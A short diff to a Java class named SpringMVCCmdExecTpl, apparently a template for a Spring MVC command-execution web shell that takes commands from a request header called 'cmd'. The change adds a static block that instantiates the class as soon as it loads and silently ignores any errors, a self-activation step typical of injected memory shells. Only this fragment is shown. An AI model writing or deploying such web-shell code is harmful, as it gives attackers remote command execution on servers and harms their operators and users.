@@ -8,6 +8,12 @@ import java.util.Scanner;
 
 public class SpringMVCCmdExecTpl {
 
+    static {
+        try {
+            new SpringMVCCmdExecTpl();
+        } catch (Exception e) {
+        }
+    }
     private String getReqHeaderName() {
         return "cmd";
     }
